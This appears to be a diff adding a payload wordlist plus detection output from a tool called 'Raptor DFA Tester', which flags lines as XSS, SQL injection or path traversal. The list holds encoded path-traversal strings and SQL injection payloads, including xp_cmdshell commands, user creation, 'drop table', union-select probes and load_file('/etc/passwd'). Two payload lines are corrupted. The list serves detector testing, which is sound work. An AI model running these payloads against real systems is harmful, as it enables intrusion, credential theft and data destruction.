+/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{file}
+/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{file}
+/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{file}
+/%%32%65%%32%65%%35%63{file}
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{file}
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{file}
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{file}
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{file}
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{file}
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{file}
+/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{file}
+/../{file}
+/../../{file}
+/../../../{file}
+/../../../../{file}
+/../../../../../{file}
+/../../../../../../{file}
+/../../../../../../../{file}
+/../../../../../../../../{file}
+/..%2f{file}
+/..%2f..%2f{file}
+/..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}
+/%2e%2e/{file}
+/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/..%252f{file}
+/..%252f..%252f{file}
+/..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{file}
+/%252e%252e/{file}
+/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/..\{file}
+/..\..\{file}
+/..\..\..\{file}
+/..\..\..\..\{file}
+/..\..\..\..\..\{file}
+/..\..\..\..\..\..\{file}
+/..\..\..\..\..\..\..\{file}
+/..\..\..\..\..\..\..\..\{file}
+/..%5c{file}
+/..%5c..%5c{file}
+/..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c{file}'; 
+exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or 1=1 --
+' union (select @@version) --
+' union (select null, (select @@version)) --
+' union (select null, null, (select @@version)) --
+' union (select null, null, null,  (select @@version)) --
+' union (select null, null, null, null,  (select @@version)) --
+' union (select null, null, null, null,  null, (select @@version)) --
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{file}
+/%2e%2e\{file}
+/%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+admin' or '
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+bfilename
+char%4039%41%2b%40select
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec(@q)
+declare @q nvarchar (4000) select @q =
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s) 
+declare @s varchar(22) select @s =
+declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e
+exec(@s)
+'; exec ('sel' + 'ect us' + 'er')
+exec sp
+'; execute immediate 'sel' || 'ect us' || 'er'
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+truncate
+tz_offset
+' union all select
+' union all select @@version--
+' union select 
+uni/**/on sel/**/ect
+' union select
+' union select 1,load_file('/etc/passwd'),1,1,1;
+) union select * from information_schema.tables;
+' union select * from users where login = char(114,111,111,116);
+'||utl_http.request
+,@variable
+@variable
+@var select @var as var into temp end --
+\x27union select
+√Ω or 1=1 --
+,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(30ëÖD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(30ëÖ
+Have XSS here! line number 1 
+Have XSS here! line number 2 
+Have XSS here! line number 3 
+Have XSS here! line number 4 
+Have XSS here! line number 5 
+Have XSS here! line number 7 
+Have SQL injection here line number 8 
+Have XSS here! line number 9 
+Have XSS here! line number 10 
+Have XSS here! line number 11 
+Have XSS here! line number 12 
+Have XSS here! line number 13 
+Have XSS here! line number 14 
+Have XSS here! line number 15 
+Have XSS here! line number 16 
+Have XSS here! line number 17 
+Have XSS here! line number 18 
+Have XSS here! line number 19 
+Have XSS here! line number 20 
+Have XSS here! line number 21 
+Have XSS here! line number 22 
+Have XSS here! line number 23 
+Have XSS here! line number 24 
+Have XSS here! line number 25 
+Have XSS here! line number 26 
+Have XSS here! line number 27 
+Have XSS here! line number 28 
+Have XSS here! line number 29 
+Have XSS here! line number 31 
+Have XSS here! line number 32 
+Have XSS here! line number 33 
+Have XSS here! line number 34 
+Have XSS here! line number 35 
+Have XSS here! line number 36 
+Have XSS here! line number 37 
+Have XSS here! line number 38 
+Have XSS here! line number 39 
+Have SQL injection here line number 40 
+Have XSS here! line number 41 
+Have XSS here! line number 42 
+Have XSS here! line number 43 
+Have XSS here! line number 44 
+Have XSS here! line number 45 
+Have SQL injection here line number 46 
+Have SQL injection here line number 48 
+Have SQL injection here line number 50 
+Have SQL injection here line number 51 
+Have SQL injection here line number 52 
+Have SQL injection here line number 53 
+Have SQL injection here line number 58 
+Have SQL injection here line number 60 
+Have SQL injection here line number 61 
+Have SQL injection here line number 62 
+Have SQL injection here line number 63 
+Have SQL injection here line number 64 
+Have SQL injection here line number 65 
+Have SQL injection here line number 72 
+Have XSS here! line number 73 
+Have XSS here! line number 74 
+Have XSS here! line number 75 
+Have XSS here! line number 76 
+Have XSS here! line number 77 
+Have XSS here! line number 78 
+Have XSS here! line number 79 
+Have XSS here! line number 80 
+Have XSS here! line number 81 
+Have XSS here! line number 82 
+Have XSS here! line number 83 
+Have XSS here! line number 84 
+Have XSS here! line number 85 
+Have XSS here! line number 86 
+Have XSS here! line number 87 
+Have XSS here! line number 88 
+Have XSS here! line number 89 
+Have XSS here! line number 90 
+Have XSS here! line number 91 
+Have XSS here! line number 92 
+Have XSS here! line number 93 
+Have XSS here! line number 94 
+Have XSS here! line number 95 
+Have XSS here! line number 96 
+Have XSS here! line number 97 
+Have XSS here! line number 98 
+Have XSS here! line number 100 
+Have XSS here! line number 101 
+Have PATH Traversal here! line number 102 
+Have PATH Traversal here! line number 103 
+Have PATH Traversal here! line number 104 
+Have PATH Traversal here! line number 105 
+Have PATH Traversal here! line number 108 
+Have PATH Traversal here! line number 109 
+Have PATH Traversal here! line number 110 
+Have PATH Traversal here! line number 111 
+Have PATH Traversal here! line number 112 
+Have PATH Traversal here! line number 113 
+Have PATH Traversal here! line number 116 
+Have PATH Traversal here! line number 117 
+Have PATH Traversal here! line number 118 
+Have PATH Traversal here! line number 119 
+Have PATH Traversal here! line number 120 
+Have PATH Traversal here! line number 121 
+Have PATH Traversal here! line number 124 
+Have PATH Traversal here! line number 125 
+Have PATH Traversal here! line number 126 
+Have PATH Traversal here! line number 127 
+Have PATH Traversal here! line number 128 
+Have PATH Traversal here! line number 129 
+Have PATH Traversal here! line number 146 
+Have PATH Traversal here! line number 147 
+Have PATH Traversal here! line number 148 
+Have PATH Traversal here! line number 149 
+Have PATH Traversal here! line number 152 
+Have PATH Traversal here! line number 153 
+Have PATH Traversal here! line number 154 
+Have PATH Traversal here! line number 155 
+Have PATH Traversal here! line number 156 
+Have PATH Traversal here! line number 157 
+Have PATH Traversal here! line number 159 
+Have PATH Traversal here! line number 160 
+Have PATH Traversal here! line number 161 
+Have PATH Traversal here! line number 162 
+Have PATH Traversal here! line number 163 
+Have PATH Traversal here! line number 164 
+Have PATH Traversal here! line number 167 
+Have PATH Traversal here! line number 168 
+Have PATH Traversal here! line number 169 
+Have PATH Traversal here! line number 170 
+Have PATH Traversal here! line number 171 
+Have PATH Traversal here! line number 172 
+Have SQL injection here line number 183 
+Have SQL injection here line number 184 
+Have SQL injection here line number 185 
+Have SQL injection here line number 186 
+Have SQL injection here line number 187 
+Have SQL injection here line number 188 
+Have SQL injection here line number 189 
+Have SQL injection here line number 190 
+Have SQL injection here line number 191 
+Have SQL injection here line number 192 
+Have SQL injection here line number 193 
+Have SQL injection here line number 194 
+Have SQL injection here line number 195 
+Have SQL injection here line number 196 
+Have SQL injection here line number 197 
+Have SQL injection here line number 198 
+Have SQL injection here line number 199 
+Have SQL injection here line number 200 
+Have SQL injection here line number 201 
+Have SQL injection here line number 202 
+Have SQL injection here line number 203 
+Have SQL injection here line number 204 
+Have SQL injection here line number 205 
+Have SQL injection here line number 206 
+Have SQL injection here line number 207 
+Have SQL injection here line number 208 
+Have SQL injection here line number 209 
+Have SQL injection here line number 210 
+Have SQL injection here line number 211 
+Have SQL injection here line number 212 
+Have SQL injection here line number 213 
+Have SQL injection here line number 214 
+Have SQL injection here line number 215 
+Have SQL injection here line number 216 
+Have SQL injection here line number 217 
+Have SQL injection here line number 218 
+Have SQL injection here line number 219 
+Have SQL injection here line number 220 
+Have SQL injection here line number 221 
+Have SQL injection here line number 222 
+Have SQL injection here line number 223 
+Have SQL injection here line number 224 
+Have SQL injection here line number 225 
+Have SQL injection here line number 226 
+Have SQL injection here line number 227 
+Have SQL injection here line number 228 
+Have SQL injection here line number 229 
+Have SQL injection here line number 230 
+Have SQL injection here line number 231 
+Have SQL injection here line number 232 
+Have PATH Traversal here! line number 244 
+Have PATH Traversal here! line number 245 
+Have PATH Traversal here! line number 246 
+Have PATH Traversal here! line number 247 
+Have PATH Traversal here! line number 248 
+Have PATH Traversal here! line number 249 
+Have PATH Traversal here! line number 250 
+Have PATH Traversal here! line number 251 
+Have PATH Traversal here! line number 252 
+Have PATH Traversal here! line number 253 
+Have PATH Traversal here! line number 254 
+Have PATH Traversal here! line number 255 
+Have PATH Traversal here! line number 256 
+Have PATH Traversal here! line number 257 
+Have PATH Traversal here! line number 258 
+Have PATH Traversal here! line number 259 
+Have PATH Traversal here! line number 268 
+Have PATH Traversal here! line number 269 
+Have PATH Traversal here! line number 270 
+Have PATH Traversal here! line number 271 
+Have PATH Traversal here! line number 272 
+Have PATH Traversal here! line number 273 
+Have PATH Traversal here! line number 274 
+Have PATH Traversal here! line number 275 
+Have PATH Traversal here! line number 276 
+Have PATH Traversal here! line number 277 
+Have PATH Traversal here! line number 278 
+Have PATH Traversal here! line number 279 
+Have PATH Traversal here! line number 280 
+Have PATH Traversal here! line number 283 
+Have PATH Traversal here! line number 284 
+Have PATH Traversal here! line number 285 
+Have PATH Traversal here! line number 286 
+Have PATH Traversal here! line number 287 
+Have PATH Traversal here! line number 288 
+Have PATH Traversal here! line number 289 
+Have PATH Traversal here! line number 290 
+Have PATH Traversal here! line number 291 
+Have PATH Traversal here! line number 292 
+Have PATH Traversal here! line number 293 
+Have PATH Traversal here! line number 294 
+Have PATH Traversal here! line number 295 
+Have PATH Traversal here! line number 296 
+Have PATH Traversal here! line number 297 
+Have PATH Traversal here! line number 298 
+Have PATH Traversal here! line number 299 
+Have PATH Traversal here! line number 300 
+Have PATH Traversal here! line number 301 
+Have PATH Traversal here! line number 302 
+Have PATH Traversal here! line number 303 
+Have PATH Traversal here! line number 304 
+Have PATH Traversal here! line number 313 
+Have PATH Traversal here! line number 314 
+Have PATH Traversal here! line number 315 
+Have PATH Traversal here! line number 316 
+Have PATH Traversal here! line number 317 
+Have PATH Traversal here! line number 318 
+Have PATH Traversal here! line number 319 
+Have PATH Traversal here! line number 320 
+Have PATH Traversal here! line number 321 
+Have PATH Traversal here! line number 322 
+Have PATH Traversal here! line number 323 
+Have PATH Traversal here! line number 324 
+Have PATH Traversal here! line number 325 
+Have PATH Traversal here! line number 326 
+Have PATH Traversal here! line number 327 
+Have PATH Traversal here! line number 328 
+Have PATH Traversal here! line number 331 
+Have PATH Traversal here! line number 332 
+Have PATH Traversal here! line number 333 
+Have PATH Traversal here! line number 334 
+Have PATH Traversal here! line number 335 
+Have PATH Traversal here! line number 336 
+Have PATH Traversal here! line number 340 
+Have PATH Traversal here! line number 341 
+Have PATH Traversal here! line number 342 
+Have PATH Traversal here! line number 343 
+Have PATH Traversal here! line number 344 
+Have PATH Traversal here! line number 345 
+Have PATH Traversal here! line number 363 
+Have PATH Traversal here! line number 364 
+Have PATH Traversal here! line number 365 
+Have PATH Traversal here! line number 366 
+Have PATH Traversal here! line number 367 
+Have PATH Traversal here! line number 368 
+Have PATH Traversal here! line number 369 
+Have PATH Traversal here! line number 372 
+Have PATH Traversal here! line number 373 
+Have PATH Traversal here! line number 374 
+Have PATH Traversal here! line number 375 
+Have PATH Traversal here! line number 376 
+Have PATH Traversal here! line number 377 
+Have PATH Traversal here! line number 380 
+Have PATH Traversal here! line number 381 
+Have PATH Traversal here! line number 382 
+Have PATH Traversal here! line number 383 
+Have PATH Traversal here! line number 384 
+Have PATH Traversal here! line number 385 
+Have PATH Traversal here! line number 388 
+Have PATH Traversal here! line number 389 
+Have PATH Traversal here! line number 406 
+Have PATH Traversal here! line number 407 
+Have PATH Traversal here! line number 408 
+Have PATH Traversal here! line number 409 
+Have PATH Traversal here! line number 410 
+Have PATH Traversal here! line number 411 
+Have PATH Traversal here! line number 412 
+Have PATH Traversal here! line number 413 
+Have PATH Traversal here! line number 415 
+Have PATH Traversal here! line number 416 
+Have PATH Traversal here! line number 417 
+Have PATH Traversal here! line number 418 
+Have PATH Traversal here! line number 419 
+Have PATH Traversal here! line number 420 
+Have PATH Traversal here! line number 421 
+Have PATH Traversal here! line number 424 
+Have PATH Traversal here! line number 425 
+Have PATH Traversal here! line number 426 
+Have PATH Traversal here! line number 427 
+Have PATH Traversal here! line number 428 
+Have SQL injection here line number 433 
+Have SQL injection here line number 434 
+Have SQL injection here line number 435 
+Have SQL injection here line number 436 
+Have SQL injection here line number 437 
+Have SQL injection here line number 438 
+Have SQL injection here line number 439 
+Have SQL injection here line number 440 
+Have PATH Traversal here! line number 441 
+Have PATH Traversal here! line number 444 
+Have PATH Traversal here! line number 445 
+Have PATH Traversal here! line number 446 
+Have PATH Traversal here! line number 447 
+Have PATH Traversal here! line number 448 
+Have PATH Traversal here! line number 449 
+Have SQL injection here line number 451 
+Have SQL injection here line number 452 
+Have SQL injection here line number 459 
+Have SQL injection here line number 460 
+Have SQL injection here line number 463 
+Have SQL injection here line number 465 
+Have SQL injection here line number 466 
+Have SQL injection here line number 472 
+Have SQL injection here line number 476 
+Have SQL injection here line number 478 
+Have SQL injection here line number 484 
+Have SQL injection here line number 485 
+Have SQL injection here line number 486 
+Have SQL injection here line number 487 
+Have SQL injection here line number 488 
+Have SQL injection here line number 489 
+Have SQL injection here line number 490 
+Have SQL injection here line number 491 
+Have SQL injection here line number 492 
+Have SQL injection here line number 493 
+Have SQL injection here line number 494 
+Have SQL injection here line number 495 
+Have SQL injection here line number 496 
+Have SQL injection here line number 497 
+Have SQL injection here line number 498 
+Have SQL injection here line number 499 
+Have SQL injection here line number 500 
+Have SQL injection here line number 501 
+Have SQL injection here line number 502 
+Have SQL injection here line number 503 
+Have SQL injection here line number 504 
+Have SQL injection here line number 505 
+Have SQL injection here line number 506 
+Have SQL injection here line number 507 
+Have SQL injection here line number 508 
+Raptor DFA Tester
+Total of matchs 349
+Lines: 509
